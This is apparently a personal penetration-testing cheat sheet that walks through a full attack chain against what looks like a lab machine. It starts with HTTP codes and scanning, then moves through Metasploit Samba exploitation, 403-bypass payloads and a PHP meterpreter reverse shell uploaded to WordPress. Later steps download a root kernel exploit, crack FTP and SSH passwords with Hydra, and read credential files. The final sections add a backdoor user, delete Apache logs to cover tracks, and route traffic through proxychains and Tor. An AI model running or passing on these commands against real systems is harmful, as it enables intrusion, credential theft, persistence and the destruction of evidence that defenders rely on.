# SYSTEM PENETRATION-TESTING

- [SYSTEM PENETRATION-TESTING](#system-penetration-testing)
  - [HTTP status codes](#http-status-codes)
  - [Directory brute force](#directory-brute-force)
  - [NMAP](#nmap)
  - [Ports You Can Hack](#ports-you-can-hack)
  - [How to Bypass 403 restrictions](#how-to-bypass-403-restrictions)
    - [GTFOBins](#gtfobins)


## HTTP status codes

- HTTP status 200 – Successful
  - The HTTP 200 OK success status response code indicates that the request has succeeded. A 200 response is cache-able by default.
  - The meaning of a success depends on the HTTP request method: GET : The resource has been fetched and is transmitted in the message body.

 - HTTP status 301 – Moved Permanently
   - The HTTP 301 Moved Permanently redirect status response code indicates that the requested resource has been definitively moved to the URL given by the Location headers. A browser redirects to the new URL and search engines update their links to the resource.

 - HTTP status 302 – Found
   - The HTTP 302 Found redirect status response code indicates that the resource requested has been temporarily moved to the URL given by the Location header. A browser redirects to this page but search engines don't update their links to the resource (in 'SEO-speak', it is said that the 'link-juice' is not sent to the new URL).

 - HTTP status 303 - See Other
   - The HTTP 303 See Other redirect status response code indicates that the redirects don't link to the requested resource itself, but to another page (such as a confirmation page, a representation of a real-world object — see HTTP range-14 — or an upload-progress page). This response code is often sent back as a result of PUT or POST. The method used to display this redirected page is always GET.

 - HTTP status 304 - Not Modified
   - The HTTP 304 Not Modified client redirection response code indicates that there is no need to retransmit the requested resources. It is an implicit redirection to a cached resource. This happens when the request method is a safe method, such as GET or HEAD, or when the request is conditional and uses an If-None-Match or an If-Modified-Since header.

 - HTTP status 400 - Bad Request
   - The server can't process the request due to client-side errors.

 - HTTP status 401 – Unauthorized
   - The 401-status code indicates that the HTTP request has not been applied because it lacks valid authentication credentials (usually username and password) for the target resource.
   - If the request included authentication credentials, the 401 response indicates that authorization has been refused for those credentials. Please check if your username and password are correct.

 - HTTP status 403 – Forbidden
   - This is a permissions issue. You often encounter this error when no index file (.htm, .html or .php) is present and the directory listing is off for a folder in the Web space (Line "Options -Indexes" in a .htaccess file).
   - Sometimes user authentication was provided, but the authenticated user is not permitted to view the content of the folder or file. Other times the operation is forbidden to all users. Sometimes this error occurs if there are too many connections at the same time. The easyname support team can explain you this issue in depth.

 - HTTP status 404 - Not Found
   - This error message is shown when a site or folder on a server are requested but cannot be found at the given URL. Please check your input.
   - Please note that this error can also appear if there is no start file (index.php or index.html).

 - HTTP status 406 - Not Acceptable
   - This error often occurs with the application firewall (mod_security). To protect against attacks on web applications, incoming and outgoing data traffic is checked for rule violations. If an action violates one of these rules, the corresponding IP address is temporarily blocked, and the user receives the status message "406 - Not Acceptable".
   - The IP address is automatically unblocked after some time and access to the web application is then possible again. The time period depends on the severity of the violation.
   - Another possibility to make it accessible again is to deactivate the application firewall. It can be deactivated either for the entire web hosting or only for individual subdomains.

 - HTTP Error 408 - Request Timeout
   - The server took longer than its allocated timeout window. In this case the server terminates the connection.

 - HTTP status 429 - Too Many Requests
   - The HTTP 429 Too Many Requests response status code indicates the user has sent too many requests in a given amount of time.
   - A Retry-After header might be included to this response indicating how long to wait before making a new request.

 - HTTP status 500 - Internal Server Error
   - This is a "catch all" status for unexpected errors. The server-side error message is commonly caused by eg. misconfigured .htaccess files or PHP errors, which you you can check in the file php_error.log on your Webhost.
   - You can find the php_error.log file in the /log/ directory - this directory can be found on the same level as your /html/ directory

 - HTTP status 502 - Bad Gateway
   - This HTTP status code indicates that under the specified URL there's no content to be displayed.

 - HTTP status 503 - Service unavailable
   - This means, that the server is currently unavailable, or the server is unable to respond to the request. You can check the file php_error.log as described for the status code 500.

 - HTTP status 504 - Gateway timeout
   - This means, that the server has not responded within the specified time period.

## Directory brute force

 - Directory brute force is used to find hidden and often forgotten directories on a site to try to compromise. Some various automated tools and scripts retrieve the status of the directory which is brute forced from custom wordlists.
 - dirsearch - Web path discovery
   - python3 dirsearch.py -u <Target IP or URL>
 - ffuf - Fuzz Faster U Fool
   - ffuf - Fast web fuzzer written in Go
   - ffuf -w lfi-payload.txt -u https://0a4c003c0455c109c0b78cec00a200ef.web-security-academy.net/image?filename=FUZZ -mc 200

## NMAP

 - Nmap ("Network Mapper") is used to discover hosts and services on a computer network by sending packets and analyzing the responses. Nmap provides a number of features for probing computer networks, including host discovery and service and operating system detection.
   - nmap -p <port or port range (1-100)> <target IP>, used to scan ports.
   - nmap -p- -A <target ip>, used to scan for all ports
   - Whenever you found open port that means you can get access through it.
   - If you see (ftp-anon: Anonymous FTP login allowed (FTP code 230)) go to the ftp service and enter
```console
Username: anonymous

Password: anonymous
```
Example output:
```console
   - ftp 192.168.1.36
Connected to 192.168.1.36
.
220-
220-|------------------------------------------------------------|
220-| Harry, make sure to update the banner when you get a chance to show who has access here |
220-|------------------------------------------------------------|
220-
220
Name (192.168.1.36:kali): anonymous
331 Please specify the password.
Password: anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

## Ports You Can Hack

 - Ports / protocols: You Can Hack
   - ftp
   - ssh
 - msfconsole is metasploit v6.2.15-dev
   - search samba
   - use 14 or exploit/linux/samba/is_known_pipename
   - set RHOSTS 192.168.1.36
   - set RPORT 139
   - RHOSTS : Target’s IP
   - LHOSTS : Attacker’s IP(Our IP)
   - RPORT : 139
   - LPORT : any available ports in your OS (4444/1337)

 - mysql

 - wafw00f is used to detect web application firewall.
   - wafw00f <url>

 - nikto - Scan web server for known vulnerabilities
   - nikto -h
   - nikto -host <target ip>
   - nikto -host 192.168.1.36 -port 12380

 - wpscan - WordPress Security Scanner
   - wpscan --url https://192.168.1.36:12380/blogblog/ -e vp -e vt -e u
   - wpscan --url https://192.168.1.36:12380/blogblog/ -e vp -e vt -e u --disable-tls-checks
   - wpscan --url https://192.168.1.36:12380/blogblog/ -U john -P /usr/share/wordlists/rockyou.txt --disable-tls-checks
   - after password cracked go on the targeted website and login.

## How to Bypass 403 restrictions

 - Adding in URL Paths: Adding this in paths of the URL and the file which is forbidden
   - /_ (EX: xyz.com/secret/_)
   - /%2f/ (EX: xyz.com/%2f/secret.txt/)
   - /./ (EX: xyz.com/secret/./)
   - // (EX: xyz.com//secret)
   - /_/ (EX: xyz.com/secret/_/)
 - Adding Headers in request :By adding different headers in request with value 127.0.0.1 can also help in bypassing restrictions.
   - X-Custom-IP-Authorization
   - X-Forwarded-For
   - X-Forward-For
   - X-Remote-IP
   - X-Originating-IP
   - X-Remote-Addr
   - X-Client-IP
   - X-Real-IP
 - New 403 Bypass
   - Download.php?file=../config.php ==> 403
   - Download.php?file=. /config.php⨀ ==> 200
   - Download.php?file=⊡ /config.php⨀ ==> 200
   - Download.php?file= .⊡ /config.php ==> 200

 - msfvenom - a Metasploit standalone payload generator.
   - Also, a replacement for msfpayload and msfencode.
   - It is use for creating a payload.
   - Payload is a malware or a malicious code that the threat actor intends to deliver to the victim.
   - msfvenom -p php/mererpreter/reverse_tcp LHOST=192.168.1.2 LPORT=1337 -f raw
   - will get a raw payload code.
   - Remove /_ from the beginning and create .php file.
   - And then upload these .php file in the target’s plugins.
   - Before executing this payload file. We need to create listener
   - Msfconsole
   - msf6 > use exploit/multi/handler
   - `> set LHOST 192.168.1.2`
   - `> set LPORT 1337`
   - `> set payload php/meterpreter/reverse_tcp`
   - `> run`
   - Now the Listener is started to u can execute the .php file that you have uploaded to the target server https://192.168.1.35:12380/blogblog/wp-content/uploads/
   - meterpreter > shell

```shell
   python3 -c 'import pty;pty.spawn("/bin/bash")'
   cd /home/www
   cd
   cd /var/www/https/blogblog
   cat wp-config.php
 # here we got phpadmin user and passwd
 # /\*\* MySQL database username & password _/
   define('DB_USER', 'root');
   define('DB_PASSWORD', 'plbkac');
 # but we need to escalating privilege
   cd /home/www
   lsb_release -a
   Description: Ubuntu 16.04 LTS
```

   - Exploit-DB Mirror: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip
   - If .zip use unzip to extract, if .gz use gunzip to extract

```shell
wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip
unzip 39772.zip
cd 39772
# to extract .tar extension tar -xvf <file.tar>
cd ebpf_mapfd_doubleput_exploit
./compile.sh
./doubleput
```

 - Now if you check whoami it will show ‘root’
 - Hydra is a tool to guess/crack valid login/password pairs.

```shell
hydra -h

hydra -l elly -e nsr
 - Ex. Username: elly
 - n = null : Password: \_\_\_
 - s = same : Password: elly
 - r = reverse : Password: ylle
   - FTP : 21/tcp

hydra -l elly -e nsr ftp://192.168.1.35
[DATA] attacking ftp://192.168.1.35:21/
[21][ftp] host: 192.168.1.35 login: elly password: ylle
1 of 1 target successfully completed, 1 valid password found
```

now look for the sensitive files like, get dbconfig-common, shadow, passwd.

In the passwd file we get more users list

For sorting it we use:

`cat passwd | grep /home`
: will shows only user’s details

`cat passwd | grep /home | cut -d ':' -f 1`
: only will show usernames

`cat passwd | grep /home | cut -d ':' -f 1| tee users.txt`
: to save it into users text file

`hydra -L users.txt -e nsr ftp://192.168.1.35`

here we get all cracked passwords for users who used nsr
   - SSH : 22/tcp

Here we can try hydra on ssh ports

`hydra -L users.txt -e nsr ssh://192.168.1.35`

`ssh SHayslett@192.168.1.35`
 - passwd: SHayslett

### GTFOBins

GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems. -- <https://gtfobins.github.io>

Ex. Search for sudo ftp permissions
 - sudo ftp
 - !/bin/sh

For escalating privilege repeat these steps

Use exploit exploit-db.com/exploits/39772

Dwnld > extract > and commands > XD root@red

   - Maintain Access in the target machine

You can add user by creating

 - adduser bobby
 - pswd: hacked
   - Covering Tracks

```shell
cd /var/log/apache2

cat access.log | grep '192.168'
```

 - this are the logs you have to delete related to u rip
 - rm access.log
 - or you can just simply delete all the log files present and get out

 - MORE TIPS:
   - Crack Zip passwd

`fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <zipfile.zip>`

 - Crack PDF passwd

`pdfcrack -f <file.pdf> -w /usr/share/wordlists/rockyou.txt`

 - Proxy chaining (Become Anonymous)
   - Proxychains in Linux is another tool for anonymity providing anonymity and safe browsing with proxychains is easy. The proxychains works on socks4, socks5, HTTP, and https protocols.
   - locate proxychains

`/etc/proxychains.conf`
   - Disable strict_chain (Add # infront)
   - Enable dynamic_chain (Remove #)
   - Enable proxy_dns (default)
   - Disable socks4 127.0.0.1 9050 (default)
   - Add new proxy servers (https://spys.one/en/)

```shell
P.TYPE=======P.IP=======PORT

socks4 125.26.99.228 44052

http 3.236.52.219 8888
   - Use: add proxychains before using any cmd

proxychains nmap -sT -p- <IP>
```

   - Setup With TOR:

```shell
service tor status

sudo apt-get install tor

mousepad /etc/proxychains.conf
 - Remove Dynamic chain from comment
 - comment Strict chain and Random chain
 - Remove proxy DNS from comment
 - write socks5 127.0.0.1 9050 in last line of proxy list

service tor restart

proxychains firefox www.bing.com
```